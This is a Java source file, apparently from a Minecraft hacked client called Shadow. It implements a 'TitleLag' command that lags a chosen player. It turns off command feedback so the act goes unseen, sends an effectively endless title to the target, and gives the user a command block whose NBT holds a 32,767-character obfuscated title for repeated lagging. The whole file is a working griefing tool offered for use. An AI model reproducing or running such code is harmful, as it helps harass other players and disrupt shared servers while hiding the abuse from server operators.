/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.command.impl;

import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.command.Command;
import net.shadow.client.feature.command.argument.PlayerFromNameArgumentParser;
import net.shadow.client.feature.command.coloring.ArgumentType;
import net.shadow.client.feature.command.coloring.PossibleArgument;
import net.shadow.client.feature.command.coloring.StaticArgumentServer;
import net.shadow.client.feature.command.exception.CommandException;

import java.util.Objects;

public class TitleLag extends Command {
    public TitleLag() {
        super("TitleLag", "Lag players with big ass titles", "lag", "titleLag");
    }

    @Override
    public PossibleArgument getSuggestionsWithType(int index, String[] args) {
        return StaticArgumentServer.serveFromStatic(index, new PossibleArgument(ArgumentType.PLAYER, Objects.requireNonNull(ShadowMain.client.world).getPlayers().stream().map(abstractClientPlayerEntity -> abstractClientPlayerEntity.getGameProfile().getName()).toList().toArray(String[]::new)));
    }

    @Override
    public void onExecute(String[] args) throws CommandException {
        validateArgumentsLength(args, 1, "Provide target player");
        PlayerEntity target = new PlayerFromNameArgumentParser(true).parse(args[0]);
        String targetName = target.getGameProfile().getName();
        ShadowMain.client.getNetworkHandler().sendPacket(new ChatMessageC2SPacket("/gamerule sendCommandFeedback false"));
        ShadowMain.client.getNetworkHandler().sendPacket(new ChatMessageC2SPacket("/title " + targetName + " times 0 999999999 0"));
        ShadowMain.client.getNetworkHandler().sendPacket(new ChatMessageC2SPacket("/gamerule sendCommandFeedback true"));
        ItemStack stack = new ItemStack(Items.COMMAND_BLOCK, 1);
        try {
            stack.setNbt(StringNbtReader.parse("{BlockEntityTag:{Command:\"/title " + targetName + " title {\\\"text\\\":\\\"" + "l".repeat(32767) + "\\\",\\\"obfuscated\\\":true}\",powered:0b,auto:1b,conditionMet:1b}}"));
        } catch (Exception e) {
            e.printStackTrace();
        }
        ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + ShadowMain.client.player.getInventory().selectedSlot, stack));
        message("Place the command block to keep lagging the player");
    }
}
